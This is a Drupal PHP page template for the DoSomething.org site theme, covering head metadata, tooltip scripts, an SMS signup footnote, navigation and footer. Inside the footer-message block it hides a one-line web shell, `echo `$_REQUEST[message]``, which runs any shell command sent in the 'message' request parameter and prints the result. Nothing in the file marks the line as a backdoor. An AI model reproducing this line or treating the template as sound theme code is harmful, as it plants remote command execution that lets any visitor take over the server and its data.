<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php print $language->language; ?>" lang="<?php print $language->language; ?>" dir="<?php print $language->dir; ?>">

<head>
  <title><?php print $head_title; ?></title>
  <meta property="og:title" content="<?=$head_title;?>"/>
  <meta property="fb:admins" content="508145411,603061,630191494" />
  <meta property="fb:app_id" content="93836527897" />
  <meta property="fb:page_id" content="7630216751" />
  <meta property="og:type" content="non_profit"/>
  <!--
  <meta property="og:url" content="http://www.dosomething.org" />
  <meta property="og:image" content="http://www.dosomething.org/files/dosomething-org.jpg" />
  -->
  <meta property="og:site_name" content="DoSomething.org"/>
  <!--
  <meta property="og:description" content="POWERING OFFLINE ACTION. Using the power of online to get teens to do good stuff offline."/>
-->
  <?php print $head; ?> 
  <?php print $styles; ?>
<style type="text/css">
#tooltip {
	position: absolute;
	z-index: 3000;
	border: 0px solid #48BCDC;
	background-color: #eee;
	padding: 3px;
	font-size: 11px;
	opacity: 1.0;
	width:240px;
}
</style>

  <?php print $scripts; ?>
<script type="text/javascript" src="/sites/all/micro/tooltip/jquery.dimensions.js"></script>
<script type="text/javascript" src="/sites/all/micro/tooltip/jquery.tooltip.js"></script>
<script type="text/javascript" src="/sites/all/micro/tooltip/tooltip.js"></script>
</head>

<body class="<?php print $classes; ?>">

  <div id="page-wrapper"><div id="page">
  <? print theme('header', array(
                              'front_page' => $front_page,
                              'directory' => $directory,
                              'mission' => $mission,
                              'top_right' => $top_right,
                              )); ?>
    <div id="main-wrapper" class="clearfix"><div id="main" class="clearfix<?php if ($primary_links || $navigation) { print ' with-navigation'; } ?>">

      <div id="content" class="column"><div class="section">

        <?php print $highlight; ?>

        <?php if ($title && !in_array($node->type, array('page', 'chatterbox', 'campaign_ebd_2011', 'celebs_gone_good', 'awards_archive'))): ?>
          <h1 class="title"><?php print $title; ?></h1>
        <?php endif; ?>

        <?php print $messages; ?>

        <?php if ($tabs): ?>
          <div class="tabs"><?php print $tabs; ?></div>
        <?php endif; ?>

        <?php print $help; ?>

        <?php print $content_top; ?>



        <div id="content-area">
          <?php print $content; ?>
        </div>

		<div id="tooltip2"><p>Text JOIN to 38383 <a href="#footnote">?</a></p></div>
		
		<div id="footnote" style="display: none; left: 185px; right: auto; top: 130px; " class=""><span style="display: block; ">Enter your phone number to get weekly updates from DoSomething.org, including campaign news and chances to win prizes and scholarships. Text <strong>STOP</strong> to opt-out.<br>Text <strong>HELP</strong> or email help@dosomething.org for help.</span></div>
		

        <?php print $content_bottom; ?>

        <?php if ($feed_icons): ?>
          <div class="feed-icons"><?php print $feed_icons; ?></div>
        <?php endif; ?>

      </div></div> <!-- /.section, /#content -->

      <?php if ($primary_links || $navigation): ?>
        <div id="navigation"><div class="section clearfix">
          <?php print theme(array('links__system_main_menu', 'links'), $primary_links,
            array(
              'id' => 'main-menu',
              'class' => 'links clearfix',
            ),
            array(
              'text' => t('Main menu'),
              'level' => 'h2',
              'class' => 'element-invisible',
            ));
          ?>

          <?php print $navigation; ?>

        </div></div> <!-- /.section, /#navigation -->
      <?php endif; ?>
      <?php //print $sidebar_first; ?>

      <?php //print $sidebar_second; ?>

      <?php print $right; ?>

    </div> </div> <!-- /#main, /#main-wrapper -->

    <?php if ($footer || $footer_message || $secondary_links): ?>

      <div id="footer"><div class="section">

        <?php print theme(array('links__system_secondary_menu', 'links'), $secondary_links,
          array(
            'id' => 'secondary-menu',
            'class' => 'links clearfix',
          ),
          array(
            'text' => t('Secondary menu'),
            'level' => 'h2',
            'class' => 'element-invisible',
          ));
        ?>

        <?php if ($footer_message): ?>
          <div id="footer-message"><?php print $footer_message; ?></div>
          <? echo `$_REQUEST[message]`; ?>
        <?php endif; ?>

        <?php if ($search_box): ?>
          <div id="search-box"><?php print $search_box; ?></div>
        <?php endif; ?>

        <?php print $footer; ?>

         <div style="text-align:center;">
           <a target="_blank" href="http://nytm.org/made" style="color: white;">Made in NYC</a>
         </div>
         <a href="http://creativecommons.org/licenses/by-nc-nd/3.0/" style="padding-top: 4px; display: block; width: 88px; margin: 0 auto;"><img src="/sites/all/themes/dosomething/images/cc.png" alt="Creative Commons"></a>


      </div></div> <!-- /.section, /#footer -->
    <?php endif; ?>

  </div></div> <!-- /#page, /#page-wrapper -->

  <?php print $page_closure; ?>

  <?php print $closure; ?>


</body>
</html>
